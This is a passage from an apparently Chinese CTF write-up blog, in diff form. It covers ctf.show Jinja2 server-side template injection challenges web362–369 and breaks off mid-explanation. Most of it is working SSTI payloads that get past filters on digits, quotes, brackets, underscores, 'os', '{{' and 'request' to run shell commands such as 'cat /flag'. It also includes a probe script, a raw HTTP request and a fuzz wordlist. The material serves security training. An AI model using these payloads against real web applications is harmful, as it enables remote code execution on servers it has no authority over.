+    <a href="#web362%e8%bf%87%e6%bb%a4%e6%95%b0%e5%ad%97" class="header-mark"></a>[web362]过滤数字</h3><p>开始过滤数字，写个python脚本测试一下哪些数字没被过滤</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://e789961f-7694-423c-a72f-d00e630f15b3.challenge.ctf.show/?name=&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;:(&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240229163736123.png" title="image-20240229163736123" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240229163736123.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240229163736123.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240229163736123.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240229163736123.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240229163736123.png 2x"
+            sizes="auto"
+            alt="image-20240229163736123">
+    </a></figure></p>
+<p>可以用全角数字进行绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‘０’,‘１’,‘２’,‘３’,‘４’,‘５’,‘６’,‘７’,‘８’,‘９’
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">//</span><span class="err">根据上题序列，替换为全角数字</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="n">name</span><span class="o">=</span><span class="p">{{</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">０</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">１３２</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;popen&#39;</span><span class="p">](</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">以下</span><span class="n">payload是抄的</span><span class="err">，暂时抄一下</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="n">name</span><span class="o">=</span><span class="p">{{</span><span class="n">a</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;cat /flag&#34;).read()&#39;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="n">name</span><span class="o">=</span><span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">１３２</span><span class="p">]</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;eval&#39;</span><span class="p">](</span><span class="s1">&#39;__import__(&#34;os&#34;).popen(&#34;cat /flag&#34;).read()&#39;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="n">name</span><span class="o">=</span><span class="p">{{</span> <span class="n">config</span><span class="o">.</span><span class="n">__class__</span><span class="o">.</span><span class="n">__init__</span><span class="o">.</span><span class="n">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat ../flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="web363过滤单双引号" class="headerLink">
+    <a href="#web363%e8%bf%87%e6%bb%a4%e5%8d%95%e5%8f%8c%e5%bc%95%e5%8f%b7" class="header-mark"></a>[web363]过滤单双引号</h3><p><code>request.args.a</code>绕过</p>
+<p>payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//request绕过
+</span></span><span class="line"><span class="cl">?name={{ config.__class__.__init__.__globals__[request.args.a].popen(request.args.b).read() }}&amp;a=os&amp;b=cat ../flag
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//chr字符串拼接
+</span></span><span class="line"><span class="cl">?name={{x.__init__.__globals__[request.args.a].eval(request.args.b)}}&amp;a=__builtins__&amp;b=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="web364过滤args" class="headerLink">
+    <a href="#web364%e8%bf%87%e6%bb%a4args" class="header-mark"></a>[web364]过滤args</h3><p>用其他方式传参</p>
+<p>payload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name={{x.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)}}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Cookie传参:x1=__builtins__;x2=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发包：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">   </span><span class="nf">GET</span> <span class="nn">/?name={{x.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)}}</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">21384bce-894b-46a7-9265-8b1cba126448.challenge.ctf.show</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">x1=__builtins__;x2=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9,en;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="web365过滤args" class="headerLink">
+    <a href="#web365%e8%bf%87%e6%bb%a4args" class="header-mark"></a>[web365]过滤&rsquo;&rsquo;、&quot;&quot;、[、args</h3><p>跑fuzzy字典，发现四个过滤：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//ssti-fuzz.txt
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">[
+</span></span><span class="line"><span class="cl">]
+</span></span><span class="line"><span class="cl">_
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">{{
+</span></span><span class="line"><span class="cl">}}
+</span></span><span class="line"><span class="cl">{%
+</span></span><span class="line"><span class="cl">%}
+</span></span><span class="line"><span class="cl">{%if
+</span></span><span class="line"><span class="cl">{%endif
+</span></span><span class="line"><span class="cl">{%print(
+</span></span><span class="line"><span class="cl">1
+</span></span><span class="line"><span class="cl">2
+</span></span><span class="line"><span class="cl">3
+</span></span><span class="line"><span class="cl">4
+</span></span><span class="line"><span class="cl">5
+</span></span><span class="line"><span class="cl">6
+</span></span><span class="line"><span class="cl">7
+</span></span><span class="line"><span class="cl">8
+</span></span><span class="line"><span class="cl">9
+</span></span><span class="line"><span class="cl">0
+</span></span><span class="line"><span class="cl">&#39;
+</span></span><span class="line"><span class="cl">&#34;
+</span></span><span class="line"><span class="cl">+
+</span></span><span class="line"><span class="cl">%2B
+</span></span><span class="line"><span class="cl">%2b
+</span></span><span class="line"><span class="cl">join()
+</span></span><span class="line"><span class="cl">u
+</span></span><span class="line"><span class="cl">os
+</span></span><span class="line"><span class="cl">popen
+</span></span><span class="line"><span class="cl">importlib
+</span></span><span class="line"><span class="cl">linecache
+</span></span><span class="line"><span class="cl">subprocess
+</span></span><span class="line"><span class="cl">|attr()
+</span></span><span class="line"><span class="cl">request
+</span></span><span class="line"><span class="cl">args
+</span></span><span class="line"><span class="cl">value
+</span></span><span class="line"><span class="cl">cookie
+</span></span><span class="line"><span class="cl">__getitem__()
+</span></span><span class="line"><span class="cl">__class__
+</span></span><span class="line"><span class="cl">__base__
+</span></span><span class="line"><span class="cl">__bases__
+</span></span><span class="line"><span class="cl">__mro__
+</span></span><span class="line"><span class="cl">__subclasses__()
+</span></span><span class="line"><span class="cl">__builtins__
+</span></span><span class="line"><span class="cl">__init__
+</span></span><span class="line"><span class="cl">__globals__
+</span></span><span class="line"><span class="cl">__import__
+</span></span><span class="line"><span class="cl">__dic__
+</span></span><span class="line"><span class="cl">__getattribute__()
+</span></span><span class="line"><span class="cl">__getitem__()
+</span></span><span class="line"><span class="cl">__str__()
+</span></span><span class="line"><span class="cl">lipsum
+</span></span><span class="line"><span class="cl">current_app
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>过滤了四个字符<code>''</code>、<code>&quot;&quot;</code>、<code>[</code>、<code>args</code></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304185245644.png" title="image-20240304185245644" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304185245644.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304185245644.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304185245644.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304185245644.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304185245644.png 2x"
+            sizes="auto"
+            alt="image-20240304185245644">
+    </a></figure></p>
+<p>测<code>os</code>模块在哪</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{x.__class__.__bases__.__getitem__(0).__subclasses__()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304190026746.png" title="image-20240304190026746" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304190026746.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304190026746.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304190026746.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304190026746.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304190026746.png 2x"
+            sizes="auto"
+            alt="image-20240304190026746">
+    </a></figure></p>
+<p>原始payload：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__bases__.__getitem__(0).__subclasses__()[132].__init__.__globals__.popen(&#39;ls /&#39;).read()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>__getitem__</code>绕过中括号<code>[</code>过滤：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{x.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen(&#39;ls /&#39;).read()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>request对象</code>绕过引号<code>''</code>、<code>&quot;&quot;</code>过滤，<code>cookie</code>绕过<code>args</code>过滤</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{x.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.cookies.x).read()}}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Cookie传参：x=ls /
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功进行命令执行后，改cookie传参：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">x=cat /flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304193654541.png" title="image-20240304193654541" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304193654541.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304193654541.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304193654541.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304193654541.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304193654541.png 2x"
+            sizes="auto"
+            alt="image-20240304193654541">
+    </a></figure></p>
+<h3 id="web366过滤args_" class="headerLink">
+    <a href="#web366%e8%bf%87%e6%bb%a4args_" class="header-mark"></a>[web366]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_</h3><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304194812959.png" title="image-20240304194812959" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304194812959.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304194812959.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304194812959.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304194812959.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304194812959.png 2x"
+            sizes="auto"
+            alt="image-20240304194812959">
+    </a></figure></p>
+<p>在web366 payload基础上，进行<code>_</code>绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{x.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.cookies.x).read()}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>|attr()</code>+<code>request对象</code>绕过对下划线的过滤</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;&#34;|attr(&#34;__class__&#34;)
+</span></span><span class="line"><span class="cl">相当于
+</span></span><span class="line"><span class="cl">&#34;&#34;.__class__
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3)(0)|attr(request.cookies.x4)()|attr(request.cookies.x5)(132)|attr(request.cookies.x6)|attr(request.cookies.x7).popen(request.cookies.x8).read()}}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Cookie传参：
+</span></span><span class="line"><span class="cl">x1=__class__;x2=__bases__;x3=__getitem__;x4=__subclasses__;x5=__getitem__;x6=__init__;x7=__globals__;x8=tac /f*
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>没通&hellip;&hellip;</p>
+<h3 id="web367过滤args_os" class="headerLink">
+    <a href="#web367%e8%bf%87%e6%bb%a4args_os" class="header-mark"></a>[web367]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os</h3><p>通过cookie传os</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{(lipsum|attr(request.cookies.x1)).get(request.cookies.x2).popen(request.cookies.x3).read()}}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Cookie传参：x1= __globals__;x2=os;x3=tac /flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304202430444.png" title="image-20240304202430444" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304202430444.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304202430444.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304202430444.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304202430444.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20240304202430444.png 2x"
+            sizes="auto"
+            alt="image-20240304202430444">
+    </a></figure></p>
+<h3 id="web368过滤args_os" class="headerLink">
+    <a href="#web368%e8%bf%87%e6%bb%a4args_os" class="header-mark"></a>[web368]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os、{{</h3><p>通过<code>{%print(......)%}</code>替代<code>{{...}}</code>来绕过对<code>{{</code>的过滤</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%print(lipsum|attr(request.cookies.x1)).get(request.cookies.x2).popen(request.cookies.x3).read()%}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Cookie传参：x1= __globals__;x2=os;x3=tac /flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也可以用<code>{%set</code>来绕过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%set aaa=(lipsum|attr(request.cookies.x1)).get(request.cookies.x2).popen(request.cookies.x3).read()%}{% print(aaa)%}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Cookie传参：x1= __globals__;x2=os;x3=tac /flag
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="web369过滤args_osrequest" class="headerLink">
+    <a href="#web369%e8%bf%87%e6%bb%a4args_osrequest" class="header-mark"></a>[web369]过滤&rsquo;&rsquo;、&quot;&quot;、[、args、_、os、{{、request</h3><p>抄了以下payload：</p>
+<h4 id="payload1读取flag文件" class="headerLink">
+    <a href="#payload1%e8%af%bb%e5%8f%96flag%e6%96%87%e4%bb%b6" class="header-mark"></a>payload1：读取<code>/flag</code>文件：</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name=
+</span></span><span class="line"><span class="cl">{% set po=dict(po=1,p=2)|join%}
+</span></span><span class="line"><span class="cl">{% set a=(()|select|string|list)|attr(po)(24)%}
+</span></span><span class="line"><span class="cl">{% set re=dict(reque=1,st=1)|join%}
+</span></span><span class="line"><span class="cl">{% set in=(a~a~dict(init=a)|join~a~a)|join()%}
+</span></span><span class="line"><span class="cl">{% set gl=(a~a~dict(globals=q)|join~a~a)|join()%}
+</span></span><span class="line"><span class="cl">{% set ge=(a~a~dict(getitem=a)|join~a~a)%}
+</span></span><span class="line"><span class="cl">{% set bu=(a~a~dict(builtins=a)|join~a~a)|join()%}
+</span></span><span class="line"><span class="cl">{% set x=(q|attr(in)|attr(gl)|attr(ge))(bu)%}
+</span></span><span class="line"><span class="cl">{% set chr=x.chr%}
+</span></span><span class="line"><span class="cl">{% set f=chr(47)~(dict(flag=a)|join)%}
+</span></span><span class="line"><span class="cl">{% print(x.open(f).read())%}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>详解：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//构造pop
+</span></span><span class="line"><span class="cl">{% set po=dict(po=1,p=2)|join%}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//构造下划线 _
+</span></span><span class="line"><span class="cl">{% set a=(()|select|string|list)|attr(po)(24)%}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//构造request
+</span></span><span class="line"><span class="cl">{% set re=dict(reque=1,st=1)|join%}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//构造__init__
+</span></span><span class="line"><span class="cl">{% set in=(a~a~dict(init=a)|join~a~a)|join()%}
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//构造__globals__
+</span></span><span class="line"><span class="cl">{% set gl=(a~a~dict(globals=q)|join~a~a)|join()%}
